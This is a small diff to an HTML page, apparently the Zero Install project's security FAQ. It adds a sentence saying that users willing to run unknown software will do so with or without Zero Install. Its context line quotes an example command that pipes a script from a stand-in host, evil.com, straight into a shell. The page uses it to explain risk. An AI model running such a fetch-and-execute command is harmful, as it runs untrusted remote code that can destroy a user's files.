@@ -364,7 +364,12 @@ $ lynx -source http://evil.com/wipe-my-files | sh -
 
 <p>
 Both can do exactly the same amount of damage, but the second works on any
-system. Zero Install helps with large, complicated programs with lots of
+system. If a user is prepared to run unknown software, they're going to do it
+with or without Zero Install.
+</p>
+
+<p>
+Zero Install helps with large, complicated programs with lots of
 dependencies, whereas your typical malicious program is only a few lines long,
 and doesn't benefit from it.
 </p>
